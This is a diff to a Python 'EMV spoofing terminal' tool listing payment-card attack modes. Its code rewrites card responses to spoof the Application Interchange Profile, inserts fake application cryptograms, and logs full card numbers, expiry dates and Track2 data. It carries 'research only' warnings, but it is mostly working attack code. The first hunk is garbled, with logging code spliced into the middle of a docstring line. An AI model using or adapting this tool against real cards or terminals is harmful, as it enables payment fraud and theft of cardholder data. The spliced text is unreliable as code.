@@ -9,7 +9,14 @@ MALICIOUS EMV WORKFLOWS - EDUCATIONAL/RESEARCH ONLY:
 9. Bad Crypto Bypass (Invalid cryptogram acceptance)
 10. Amount Manipulation (Change transaction amounts)
 11. Currency Manipulation (Change currency codes)
-12. Force Offline High Value (Bypass online limits)
+12. Force Of    attack_info = EmvSpoofingTerminal(args.port, args.attack).get_attack_info()
+    
+    logger.info("=" * 80)
+    logger.info("🏴‍☠️ EMV SPOOFING TERMINAL - RESEARCH MODE")
+    logger.info("📡 Port: %s | Attack: %d", args.port, args.attack)
+    logger.info("🎯 %s", attack_info['description'])
+    logger.info("💀 Vector: %s", attack_info['attack_vector'])
+    logger.info("=" * 80)e High Value (Bypass online limits)
 13. CVM Bypass (Skip cardholder verification)
 
 ⚠️  WARNING: FOR SECURITY RESEARCH ONLY - DO NOT USE ON LIVE SYSTEMS
@@ -64,8 +71,8 @@ class EmvSpoofingTerminal:
                 'amount': '000000010000',  # $100.00
                 'manipulate_aip': True,
                 'fake_aip': '7C00',  # Fake full EMV capabilities
-                'real_aip': '2000',   # Actual MSD only
-                'attack_vector': 'Make MSD-only card appear as full EMV chip'
+                'preferred_aid': 'A0000000980840',  # Test with US Debit (0000 → 7C00)
+                'attack_vector': 'Make basic debit card appear as full EMV chip'
             },
             9: {
                 'name': 'Bad Crypto Bypass',
@@ -181,7 +188,7 @@ class EmvSpoofingTerminal:
             checksum = sum(frame[5:])
             frame.extend([(~checksum + 1) & 0xFF, 0x00])
             
-            logger.info("[💀-TX] %s: %s", description, apdu_hex)
+            logger.info("[ATTACK-TX] %s: %s", description, apdu_hex)
             
             response = self.send_raw_command(frame)
             
@@ -194,9 +201,17 @@ class EmvSpoofingTerminal:
                             apdu_hex_resp = apdu_data.hex().upper()
                             
                             # Apply attack-specific response manipulation
+                            original_resp = apdu_hex_resp
                             apdu_hex_resp = self.manipulate_response(apdu_hex_resp, description)
                             
-                            logger.info("[🏴‍☠️-RX] %s: %s", description, apdu_hex_resp)
+                            logger.info("[ATTACK-RX] %s: %s", description, apdu_hex_resp)
+                            
+                            # Show manipulation if it occurred
+                            if original_resp != apdu_hex_resp:
+                                logger.warning("📝 MANIPULATION: %s → %s", 
+                                             self.format_key_data(original_resp),
+                                             self.format_key_data(apdu_hex_resp))
+                            
                             return apdu_hex_resp
                         break
             
@@ -206,16 +221,49 @@ class EmvSpoofingTerminal:
             logger.error("Spoofing APDU failed - %s", e)
             return None
     
+    def format_key_data(self, response: str) -> str:
+        """Format key EMV data for educational display"""
+        try:
+            # Extract and format key EMV fields based on emv.html real data
+            if '82022000' in response:
+                return "AIP=2000(VISA-MSD)"
+            elif '82020000' in response:
+                return "AIP=0000(US-Debit-Basic)"
+            elif '82027C00' in response:
+                return "AIP=7C00(Full-EMV-Spoofed)"
+            elif '82026000' in response:
+                return "AIP=6000(Offline-Capable)"
+            elif '9F2608' in response:
+                crypto_start = response.find('9F2608') + 6
+                crypto = response[crypto_start:crypto_start+16]
+                return f"Cryptogram={crypto}"
+            elif '57' in response:
+                # Track2 data
+                return "Track2-data"
+            else:
+                return "EMV-response"
+        except Exception:
+            return "EMV-data"
+    
     def manipulate_response(self, response: str, command: str) -> str:
         """Apply attack-specific response manipulation"""
         attack_info = self.get_attack_info()
+        original_response = response
         
         if 'GPO' in command and attack_info.get('manipulate_aip'):
             # AIP Manipulation - Change AIP in GPO response
-            if '82022000' in response:  # Found AIP
+            # Real AIPs from emv.html:
+            # - VISA (A0000000031010): 82022000 (AIP=2000) 
+            # - US Debit (A0000000980840): 82020000 (AIP=0000)
+            
+            if '82022000' in response:  # VISA MSD AIP
                 fake_aip = attack_info.get('fake_aip', '7C00')
                 response = response.replace('82022000', f'8202{fake_aip}')
-                logger.warning("🚨 AIP MANIPULATED: 2000 → %s", fake_aip)
+                logger.warning("🚨 AIP MANIPULATION: Original=2000 (MSD) → Spoofed=%s (Full EMV)", fake_aip)
+            elif '82020000' in response:  # US Debit AIP  
+                fake_aip = attack_info.get('fake_aip', '7C00')
+                response = response.replace('82020000', f'8202{fake_aip}')
+                logger.warning("🚨 AIP MANIPULATION: Original=0000 (Basic) → Spoofed=%s (Full EMV)", fake_aip)
         
         if 'GPO' in command and attack_info.get('spoof_cryptogram'):
             # Cryptogram Spoofing - Insert fake cryptogram
@@ -223,8 +271,9 @@ class EmvSpoofingTerminal:
             if '9F2608' in response:  # Found Application Cryptogram tag
                 # Replace with spoofed cryptogram
                 start = response.find('9F2608') + 6
+                original_crypto = response[start:start+16]
                 response = response[:start] + fake_crypto + response[start+16:]
-                logger.warning("🚨 CRYPTOGRAM SPOOFED: %s", fake_crypto)
+                logger.warning("🚨 CRYPTOGRAM SPOOFED: Original=%s → Fake=%s", original_crypto, fake_crypto)
         
         return response
     
@@ -271,11 +320,11 @@ class EmvSpoofingTerminal:
         start_time = time.time()
         attack_info = self.get_attack_info()
         
-        logger.info("💀" * 30)
+        logger.info("=" * 60)
         logger.info("🏴‍☠️ ATTACK MODE: %s", attack_info['name'])
         logger.info("🎯 VECTOR: %s", attack_info['attack_vector'])
         logger.info("⚠️  FOR SECURITY RESEARCH ONLY!")
-        logger.info("💀" * 30)
+        logger.info("=" * 60)
         
         # Phase 1: Target acquisition
         if not self.initialize_terminal():
@@ -330,26 +379,36 @@ class EmvSpoofingTerminal:
             logger.error("💥 Malicious GPO failed")
             return False
         
-        # Analyze attack results
+        # Analyze attack results with educational details
         aip = self.extract_aip(gpo_resp)
         cryptogram = self.extract_cryptogram(gpo_resp)
         track2 = self.extract_track2(gpo_resp)
         
+        logger.info("📊 EMV ANALYSIS:")
+        
         if aip:
             expected_aip = attack_info.get('expected_aip')
-            logger.info("🔍 AIP Analysis: %s (expected: %s)", aip, expected_aip)
+            logger.info("   AIP (Application Interchange Profile): %s", aip)
+            if expected_aip:
+                logger.info("   Expected AIP: %s", expected_aip)
+            
+            # Decode AIP meaning
+            aip_meaning = self.decode_aip(aip)
+            logger.info("   AIP Capabilities: %s", aip_meaning)
             
             if attack_info.get('manipulate_aip') and aip == attack_info.get('fake_aip'):
-                logger.error("🚨 AIP MANIPULATION SUCCESSFUL!")
+                logger.error("🚨 AIP MANIPULATION SUCCESSFUL: %s → %s", 
+                           expected_aip, aip)
         
         if cryptogram:
-            logger.info("🔍 Cryptogram: %s", cryptogram)
+            logger.info("   Application Cryptogram: %s", cryptogram)
             if attack_info.get('accept_bad_crypto'):
-                logger.warning("🚨 ACCEPTING INVALID CRYPTOGRAM!")
+                logger.warning("🚨 ACCEPTING POTENTIALLY INVALID CRYPTOGRAM!")
         
         if track2:
             pan, expiry = self.parse_track2(track2)
-            logger.info("🔍 Target PAN: %s | Expiry: %s", pan, expiry)
+            logger.info("   PAN: %s | Expiry: %s", pan, expiry)
+            logger.info("   Track2 Data: %s", track2)
         
         # Skip READ RECORD for most attacks (speed optimization)
         if not attack_info.get('force_msd'):
@@ -358,7 +417,7 @@ class EmvSpoofingTerminal:
         # Calculate attack time
         total_time = time.time() - start_time
         
-        logger.info("💀" * 30)
+        logger.info("=" * 60)
         logger.info("🏴‍☠️ ATTACK COMPLETED!")
         logger.info("⚡ Attack time: %.2f seconds", total_time)
         logger.info("🎯 Vector: %s", attack_info['attack_vector'])
@@ -366,9 +425,28 @@ class EmvSpoofingTerminal:
         if total_time < 3.0:
             logger.info("🚀 FAST ATTACK ACHIEVED!")
         
-        logger.info("💀" * 30)
+        logger.info("=" * 60)
         
         return True
+    
+    def decode_aip(self, aip_hex: str) -> str:
+        """Decode AIP capabilities for educational purposes"""
+        try:
+            aip_int = int(aip_hex, 16)
+            capabilities = []
+            
+            if aip_int & 0x8000: capabilities.append("RFU")
+            if aip_int & 0x4000: capabilities.append("SDA")  # Static Data Authentication
+            if aip_int & 0x2000: capabilities.append("DDA")  # Dynamic Data Authentication
+            if aip_int & 0x1000: capabilities.append("CHV")  # Cardholder Verification
+            if aip_int & 0x0800: capabilities.append("TRM")  # Terminal Risk Management
+            if aip_int & 0x0400: capabilities.append("IssAuth")  # Issuer Authentication
+            if aip_int & 0x0200: capabilities.append("CDA")  # Combined DDA/AC
+            if aip_int & 0x0100: capabilities.append("MSD")  # Magnetic Stripe Data
+            
+            return ", ".join(capabilities) if capabilities else "No capabilities"
+        except Exception:
+            return "Unknown"
     
     def parse_ppse_aids(self, ppse_hex: str) -> List[str]:
         """Extract AIDs from PPSE response"""
@@ -479,12 +557,12 @@ def main():
     
     attack_info = EmvSpoofingTerminal(args.port, args.attack).get_attack_info()
     
-    logger.info("💀" * 40)
+    logger.info("=" * 80)
     logger.info("🏴‍☠️ EMV SPOOFING TERMINAL - RESEARCH MODE")
     logger.info("📡 Port: %s | Attack: %d", args.port, args.attack)
     logger.info("🎯 %s", attack_info['description'])
     logger.info("💀 Vector: %s", attack_info['attack_vector'])
-    logger.info("💀" * 40)
+    logger.info("=" * 80)
     
     terminal = EmvSpoofingTerminal(args.port, args.attack)
     
@@ -496,12 +574,12 @@ def main():
         
         success = terminal.execute_attack_workflow()
         
-        logger.info("💀" * 40)
+        logger.info("=" * 60)
         if success:
             logger.info("🏴‍☠️ ATTACK SEQUENCE COMPLETED!")
         else:
             logger.error("💥 ATTACK SEQUENCE FAILED!")
-        logger.info("💀" * 40)
+        logger.info("=" * 60)
         
         return success
         
